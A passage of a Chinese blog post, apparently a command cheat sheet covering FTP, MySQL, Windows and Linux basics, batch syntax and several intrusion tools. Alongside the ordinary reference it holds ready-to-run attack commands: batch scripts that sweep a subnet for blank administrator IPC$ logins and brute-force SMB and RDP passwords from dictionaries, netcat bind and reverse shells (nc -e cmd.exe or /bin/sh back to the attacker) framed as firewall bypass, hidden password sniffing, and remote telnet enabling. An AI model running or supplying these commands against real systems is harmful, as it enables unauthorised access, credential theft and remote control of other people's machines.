本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中<br>get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中<br>mget [remote-files] 从远端主机接收一批文件至本地主机<br>mput local-files 将本地主机中一批文件传送至远端主机<br>dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件，就将结果写至本地文件<br>ascii 设定以ASCII方式传送文件（缺省值）<br>bin 或 image 设定以二进制方式传送文件<br>bell 每完成一次文件传送，报警提示<br>cdup 返回上一级目录<br>close 中断与远程服务器的ftp会话（与open对应）<br>open host[port] 建立指定ftp服务器连接，可指定连接端口<br>delete 删除远端主机中的文件<br>mdelete [remote-files] 删除一批文件<br>mkdir directory-name 在远端主机中建立目录<br>rename [from] [to] 改变远端主机中的文件名<br>rmdir directory-name 删除远端主机中的目录<br>status 显示当前FTP的状态<br>system 显示远端主机系统类型<br>user user-name [password] [account] 重新以别的用户名登录远端主机<br>open host [port] 重新建立一个新的连接<br>prompt 交互提示模式<br>macdef 定义宏命令<br>lcd 改变当前本地主机的工作目录，如果缺省，就转到当前用户的HOME目录<br>chmod 改变远端主机的文件权限<br>case 当为ON时，用MGET命令拷贝的文件名到本地机器中，全部转换为小写字母<br>cd remote－dir 进入远程主机目录<br>cdup 进入远程主机目录的父目录<br>! 在本地机中执行交互shell，exit回到ftp环境，如!ls</em>.zip</li>
+</ol>
+<p>#5<br>MYSQL 命令<br>mysql -h主机地址 -u用户名 －p密码 连接MYSQL；如果刚安装好MYSQL，超级用户root是没有密码的。<br>（例：mysql -h110.110.110.110 -Uroot -P123456<br>注：u与root可以不用加空格，其它也一样）<br>exit 退出MYSQL<br>mysqladmin -u用户名 -p旧密码 password 新密码 修改密码<br>grant select on 数据库.* to 用户名@登录主机 identified by “密码”; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）<br>show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。<br>use mysql；<br>show tables; 显示库中的数据表<br>describe 表名； 显示数据表的结构<br>create database 库名； 建库<br>use 库名；<br>create table 表名 （字段设定列表）； 建表<br>drop database 库名；<br>drop table 表名； 删库和删表<br>delete from 表名； 将表中记录清空<br>select * from 表名； 显示表中的记录<br>mysqldump –opt school&gt;school.bbb 备份数据库：（命令在DOS的mysqlin目录下执行）；注释：将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。<br>win2003系统下新增命令（实用部份）：<br>shutdown &#x2F;参数 关闭或重启本地或远程主机。<br>参数说明：&#x2F;S 关闭主机，&#x2F;R 重启主机， &#x2F;T 数字 设定延时的时间，范围0～180秒之间， &#x2F;A取消开机，&#x2F;M &#x2F;&#x2F;IP 指定的远程主机。<br>例：shutdown &#x2F;r &#x2F;t 0 立即重启本地主机（无延时）<br>taskkill &#x2F;参数 进程名或进程的pid 终止一个或多个任务和进程。<br>参数说明：&#x2F;PID 要终止进程的pid，可用tasklist命令获得各进程的pid，&#x2F;IM 要终止的进程的进程名，&#x2F;F 强制终止进程，&#x2F;T 终止指定的进程及他所启动的子进程。<br>tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID）。<br>参数说明：&#x2F;M 列出当前进程加载的dll文件，&#x2F;SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。<br>Linux系统下基本命令　注：要区分大小写<br>uname 显示版本信息（同win2K的 ver）<br>dir 显示当前目录文件，ls -al 显示包括隐藏文件（同win2K的 dir）<br>pwd 查询当前所在的目录位置<br>cd cd　..回到上一层目录，注意cd 与..之间有空格。cd　&#x2F;返回到根目录。<br>cat 文件名 查看文件内容<br>cat &gt;abc.txt 往abc.txt文件中写上内容。<br>more 文件名 以一页一页的方式显示一个文本文件。<br>cp 复制文件<br>mv 移动文件<br>rm 文件名 删除文件，rm -a 目录名删除目录及子目录<br>mkdir 目录名 建立目录<br>rmdir 删除子目录，目录内没有文档。<br>chmod 设定档案或目录的存取权限<br>grep 在档案中查找字符串<br>diff 档案文件比较<br>find 档案搜寻<br>date 现在的日期、时间<br>who 查询目前和你使用同一台机器的人以及Login时间地点<br>w 查询目前上机者的详细资料<br>whoami 查看自己的帐号名称<br>groups 查看某人的Group<br>passwd 更改密码<br>history 查看自己下过的命令<br>ps 显示进程状态<br>kill 停止某进程<br>gcc 黑客通常用它来编译C语言写的文件<br>su 权限转换为指定使用者<br>telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。<br>ftp ftp连接上某服务器（同win2K）<br>批处理命令与变量<br>1：for命令及变量 基本格式<br>FOR &#x2F;参数 %variable IN (set) DO command [command_parameters] %variable：指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。<br>批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use ipipc$ pass &#x2F;user:user 中ip为%1,pass为%2,user为%3<br>(set）：指定一个或一组文件，可使用通配符，如：（D:user.txt）和（1 1 254)(1 -1 254),{ “（1 1 254）”第一个”1”指起始值，第二个”1”指增长量，第三个”254”指结束值，即：从1到254；“（1 -1 254）”说明：即从254到1 }<br>command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：&amp; 来隔开<br>command_parameters：为特定命令指定参数或命令行开关<br>IN (set）：指在（set）中取值；DO command ：指执行command<br>参数：&#x2F;L 指用增量形式{ (set）为增量形式时 }；&#x2F;F 指从文件中不断取值，直到取完为止{ (set）为文件时，如（d:pass.txt）时 }。<br>用法举例：<br>@echo off<br>echo 用法格式：test.bat <em>.</em>.* &gt; test.txt<br>for &#x2F;L %%G in (1 1 254) do echo %1.%%G &gt;&gt;test.txt &amp; net use %1.%%G &#x2F;user:administrator | find “命令成功完成” &gt;&gt;test.txt<br>存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。<br>&#x2F;L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；%%G 为变量（ip的最后一位）；&amp; 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有”命令成功完成”信息；%1.%%G 为完整的IP地址；（1 1 254) 指起始值，增长量，结止值。<br>@echo off<br>echo 用法格式：ok.bat ip<br>FOR &#x2F;F %%i IN (D:user.dic) DO smb.exe %1 %%i D:pass.dic 200<br>存为：ok.exe 说明：输入一个IP后，用字典文件d:pass.dic来暴解d:user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。<br>七：<br>2：if命令及变量 基本格式<br>IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。<br>例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。<br>0 指发现并成功执行（真）；1 指没有发现、没执行（假）。<br>IF [not] 字符串1&#x3D;&#x3D;字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。<br>例：“if “%2%”&#x3D;&#x3D;”4” goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加” “）<br>IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。<br>例：“if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到”:end”标签处。<br>IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1&#x3D;&#x3D;字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。当有del命令时需把del命令全部内容用&lt; &gt;括起来，因为del命令要单独一行时才能执行，用上&lt; &gt;后就等于是单独一行了；例如：“if exist test.txt. <del test.txt.> else echo test.txt.missing ”，注意命令中的“.”<br>系统外部命令<br>注：系统外部命令（均需下载相关工具）<br>瑞士军刀：nc.exe<br>参数说明：<br>-h 查看帮助信息<br>-d 后台模式<br>-e prog程序重定向，一但连接就执行[危险]<br>-i secs延时的间隔<br>-l 监听模式，用于入站连接<br>-L 监听模式，连接天闭后仍然继续监听，直到CTR+C<br>-n IP地址，不能用域名<br>-o film记录16进制的传输<br>-p[空格]端口 本地端口号<br>-r 随机本地及远程端口<br>-t 使用Telnet交互方式<br>-u UDP模式<br>-v 详细输出，用-vv将更详细<br>-w数字 timeout延时间隔<br>-z 将输入，输出关掉（用于扫锚时）<br>基本用法：<br>nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口<br>nc -l -p 80 开启本机的TCP 80端口并监听<br>nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口<br>nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口<br>nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口<br>高级用法：<br>nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止<br>nc -L -p 80 &gt; c:log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C，同时把结果输出到c:log.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc -L -p 80 &lt; c:honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C，并把c:honeyport.txt中内容送入管道中，亦可起到传送文件作用</span><br><span class="line">type.exe c:honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C，并把c:honeyport.txt中内容送入管道中，亦可起到传送文件作用</span><br><span class="line">本机上用：nc -l -p 本机端口</span><br><span class="line">在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K</span><br><span class="line">nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙</span><br><span class="line">本机上用：nc -d -l -p 本机端口 &lt; 要传送的文件路径及名称</span><br><span class="line">在对方主机上用：nc -vv 本机IP 本机端口 &gt; 存放文件的路径及名称 传送文件到对方主机</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">备 注：</span><br><span class="line">| 管道命令</span><br><span class="line">&lt; 或 &gt; 重定向命令。“&lt;；”，例如：tlntadmn &lt; test.txt 指把test.txt的内容赋值给tlntadmn命令</span><br><span class="line">@ 表示执行@后面的命令，但不会显示出来（后台执行）；例：@dir c:winnt &gt;&gt; d:log.txt 意思是：后台执行dir，并把结果存在d:log.txt中</span><br><span class="line">&gt;与&gt;&gt;的区别 &quot;&gt;&quot;指：覆盖；&quot;&gt;&gt;&quot;指：保存到（添加到）。</span><br><span class="line">如：@dir c:winnt &gt;&gt; d:log.txt和@dir c:winnt &gt; d:log.txt二个命令分别执行二次比较看：用&gt;&gt;的则是把二次的结果都保存了，而用：&gt;则只有一次的结果，是因为第二次的结果把第一次的覆盖了。</span><br><span class="line">八：</span><br><span class="line">扫描工具：xscan.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">基本格式</span><br><span class="line">xscan -host &lt;；起始IP&gt;[-&lt;；终止IP&gt;] &lt;；检测项目&gt; [其他选项] 扫锚&quot;起始IP到终止IP&quot;段的所有主机信息</span><br><span class="line">xscan -file &lt;；主机列表文件名&gt; &lt;；检测项目&gt; [其他选项] 扫锚&quot;主机IP列表文件名&quot;中的所有主机信息</span><br></pre></td></tr></table></figure>
+<p>检测项目<br>-active 检测主机是否存活<br>-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）<br>-port 检测常用服务的端口状态<br>-ftp 检测FTP弱口令<br>-pub 检测FTP服务匿名用户写权限<br>-pop3 检测POP3-Server弱口令<br>-smtp 检测SMTP-Server漏洞<br>-sql 检测SQL-Server弱口令<br>-smb 检测NT-Server弱口令<br>-iis 检测IIS编码&#x2F;解码漏洞<br>-cgi 检测CGI漏洞<br>-nasl 加载Nessus攻击脚本<br>-all 检测以上所有项目<br>其它选项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-i 适配器编号 设置网络适配器，&lt;；适配器编号&gt;可通过&quot;-l&quot;参数获取</span><br></pre></td></tr></table></figure>
+<p>-l 显示所有网络适配器<br>-v 显示详细扫描进度<br>-p 跳过没有响应的主机<br>-o 跳过没有检测到开放端口的主机<br>-t 并发线程数量，并发主机数量 指定最大并发线程数量和并发主机数量，默认数量为100,10<br>-log 文件名 指定扫描报告文件名 （后缀为：TXT或HTML格式的文件）<br>用法示例<br>xscan -host 192.168.1.1-192.168.255.255 -all -active -p　检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机<br>xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机<br>xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机<br>九：<br>命令行方式嗅探器： xsniff.exe<br>可捕获局域网内FTP&#x2F;SMTP&#x2F;POP3&#x2F;HTTP协议密码<br>参数说明<br>-tcp 输出TCP数据报<br>-udp 输出UDP数据报<br>-icmp 输出ICMP数据报<br>-pass 过滤密码信息<br>-hide 后台运行<br>-host 解析主机名<br>-addr IP地址 过滤IP地址<br>-port 端口 过滤端口<br>-log 文件名 将输出保存到文件<br>-asc 以ASCII形式输出<br>-hex 以16进制形式输出<br>用法示例<br>xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中<br>xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出<br>终端服务密码破解： tscrack.exe<br>参数说明<br>-h 显示使用帮助<br>-v 显示版本信息<br>-s 在屏幕上打出解密能力<br>-b 密码错误时发出的声音<br>-t 同是发出多个连接（多线程）<br>-N Prevent System Log entries on targeted server<br>-U 卸载移除tscrack组件<br>-f 使用－f后面的密码<br>-F 间隔时间（频率）<br>-l 使用－l后面的用户名<br>-w 使用－w后面的密码字典<br>-p 使用－p后面的密码<br>-D 登录主页面<br>用法示例<br>tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码<br>tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户<br>@if not exist ipcscan.txt goto noscan<br>@for &#x2F;f “tokens&#x3D;1 delims&#x3D; “ %%i in (3389.txt) do call hack.bat %%i<br>nscan<br>@echo 3389.txt no find or scan faild<br>（①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)<br>3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat<br>@if not exist tscrack.exe goto noscan<br>@tscrack %1 -l administrator -w pass.dic &gt;&gt;rouji.txt<br>:noscan<br>@echo tscrack.exe no find or scan faild<br>（②存为hack.bat) （运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了）<br>hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。<br>其它<br>Shutdown.exe<br>Shutdown IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）<br>fpipe.exe (TCP端口重定向工具） 在第二篇中有详细说明（端口重定向绕过防火墙）<br>fpipe -l 80 -s 1029 -r 80 当有人扫锚你的80端口时，他扫到的结果会完全是的主机信息<br>Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。<br>OpenTelnet.exe （远程开启telnet工具）<br>opentelnet.exe IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet ip 连接上对方。<br>NTLM认证方式：0：不使用NTLM身份验证；1：先尝试NTLM身份验证，如果失败，再使用用户名和密码；2：只使用NTLM身份验证。<br>ResumeTelnet.exe (OpenTelnet附带的另一个工具）<br>resumetelnet.exe IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。<br>FTP命令详解<br>FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。<br>FTP的命令行格式为：<br>ftp -v -d -i -n -g [主机名] ，其中<br>-v 显示远程服务器的所有响应信息<br>-n 限制ftp的自动登录，即不使用；.n etrc文件；<br>-d 使用调试方式；<br>-g 取消全局文件名。<br>FTP使用的内部命令如下（中括号表示可选项）：</p>
+<ol>
+<li>![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：！ls*.zip</li>
+<li>$ macro-ame[args]：执行宏定义macro-name。</li>
+<li>account[password]：提供登录远程系统成功后访问系统资源所需的补充口令。</li>
+<li>append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。</li>
+<li>ascii：使用ascii类型传输方式。</li>
+<li>bell：每个命令执行完毕后计算机响铃一次。</li>
+<li>bin：使用二进制文件传输方式。</li>
+<li>bye：退出ftp会话过程。</li>
+<li>case：在使用mget时，将远程主机文件名中的大写转为小写字母。</li>
+<li>cd remote-dir：进入远程主机目录。</li>
+<li>cdup：进入远程主机目录的父目录。</li>
+<li>chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。</li>
+<li>close：中断与远程服务器的ftp会话（与open对应）。</li>
+<li>cr：使用asscii方式传输文件时，将回车换行转换为回行。</li>
+<li>delete remote-file：删除远程主机文件。</li>
+<li>debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。</li>
+<li>dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。</li>
+<li>disconnection：同close。</li>
+<li>form format：将文件传输方式设置为format，缺省为file方式。</li>
+<li>get remote-file[local-file]：将远程主机的文件remote-file传至本地硬盘的local-file。</li>
+<li>glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。</li>
+<li>hash：每传输1024字节，显示一个hash符号（#）。</li>
+<li>help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。</li>
+<li>idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。</li>
+<li>image：设置二进制传输方式（同binary）。</li>
+<li>lcd[dir]：将本地工作目录切换至dir。</li>
+<li>ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。</li>
+<li>macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。</li>
+<li>mdelete[remote-file]：删除远程主机文件。</li>
+<li>mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir <em>.o.</em>.zipoutfile。</li>
+<li>mget remote-files：传输多个远程文件。</li>
+<li>mkdir dir-name：在远程主机中建一目录。</li>
+<li>mls remote-file local-file：同nlist，但可指定多个文件名。</li>
+<li>mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。</li>
+<li>modtime file-name：显示远程主机文件的最后修改时间。</li>
+<li>mput local-file：将多个文件传输至远程主机。</li>
+<li>newer file-name：如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。</li>
+<li>nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。</li>
+<li>nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。该命令特别适用于远程主机为非UNIX机的情况。</li>
+<li>ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。</li>
+<li>open host[port]：建立指定ftp服务器连接，可指定连接端口。</li>
+<li>passive：进入被动传输方式。</li>
+<li>prompt：设置多个文件传输时的交互提示。</li>
+<li>proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。</li>
+<li>put local-file[remote-file]：将本地文件local-file传送至远程主机。</li>
+<li>pwd：显示远程主机的当前工作目录。</li>
+<li>quit：同bye，退出ftp会话。</li>
+<li>quote arg1，arg2…：将参数逐字发至远程ftp服务器，如：quote syst.</li>
+<li>recv remote-file[local-file]：同get。</li>
+<li>reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。</li>
+<li>rhelp[cmd-name]：请求获得远程主机的帮助。</li>
+<li>rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。</li>
+<li>rename[from][to]：更改远程主机文件名。</li>
+<li>reset：清除回答队列。</li>
+<li>restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。</li>
+<li>rmdir dir-name：删除远程主机目录。</li>
+<li>runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。</li>
+<li>send local-file[remote-file]：同put。</li>
+<li>sendport：设置PORT命令的使用。</li>
+<li>site arg1，arg2…：将参数作为SITE命令逐字发送至远程ftp主机。</li>
+<li>size file-name：显示远程主机文件大小，如：site idle 7200。</li>
+<li>status：显示当前ftp状态。</li>
+<li>struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。</li>
+<li>sunique：将远程主机文件名存储设置为只一（与runique对应）。</li>
+<li>system：显示远程主机的操作系统类型。</li>
+<li>tenex：将文件传输类型设置为TENEX机的所需的类型。</li>
+<li>tick：设置传输时的字节计数器。</li>
+<li>trace：设置包跟踪。</li>
+<li>type[type-name]：设置文件传输类型为type-name，缺省为ascii，如：type binary，设置二进制传输方式。</li>
+<li>umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3</li>
+<li>user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。</li>
+<li>verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.</li>
+<li>?[cmd]：同help.</li>
+</ol>
+<p>内容来自百度百科</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/C-cmd%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/" rel="tag"># C, cmd命令大全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2019/08/29/C/CLearning1/" rel="prev" title="CLearning1">
+                  <i class="fa fa-angle-left"></i> CLearning1
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2019/08/30/C/CLearning3/" rel="next" title="CLearning3">
+                  CLearning3 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">lmfalcon</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
